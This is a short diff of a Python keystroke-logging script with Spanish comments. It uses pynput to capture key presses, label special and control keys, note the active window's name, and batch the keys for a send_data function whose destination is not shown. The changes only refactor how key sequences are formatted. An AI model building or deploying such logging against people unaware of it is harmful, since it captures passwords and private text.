@@ -102,7 +102,6 @@ special_keys = {
     pynput_keyboard.Key.scroll_lock: 'BLOQ_DESPL',
     pynput_keyboard.Key.pause: 'PAUSA_INTER',
     pynput_keyboard.Key.esc: 'ESCAPE',
-        # Agrega aquí otras teclas especiales si es necesario
     }
 
 def get_key_str(key):
@@ -132,8 +131,6 @@ control_char_mapping = {
     chr(i): f'CTRL_{chr(i + 64)}' for i in range(1, 27)
 }
 
-def translate_control_chars(char_sequence):
-    return ' '.join(control_char_mapping.get(char, char) for char in char_sequence)
 
 # -----------------------------------------------------------------------------
 # Función principal Log Keyboard
@@ -145,23 +142,25 @@ def logKeyboard():
     last_key_time = time()
     timer = None
     
-    def is_special_or_space(key_str):
-            return key_str in special_keys.values() or key_str == 'SPACE'
+    def is_special_key(key_str):
+            return key_str in special_keys.values()
 
     def send_data():
         nonlocal pressed_keys
         if pressed_keys:
             window_name = getActiveWindowInfo("name")
 
-            # Construye la secuencia de teclas presionadas
             typed_sequence = []
             for i, key in enumerate(pressed_keys):
                 if i > 0:
                     prev_key = pressed_keys[i - 1]
-                    if is_special_or_space(prev_key) or is_special_or_space(key):
+                    if is_special_key(prev_key) or is_special_key(key):
                         typed_sequence.append('+')
                     elif ('_' in prev_key and prev_key.split('_')[-1].isalnum()) and key.isalnum():
-                        typed_sequence.append(' + ')  # Añade un espacio y un '+' entre las teclas
+                        typed_sequence.append('+')
+                    elif prev_key.endswith(('CTRL', 'ALT', 'SHIFT', 'WIN')) or key.startswith(
+                        ('CTRL', 'ALT', 'SHIFT', 'WIN')):
+                        typed_sequence.append('+')
 
                 typed_sequence.append(key)
 
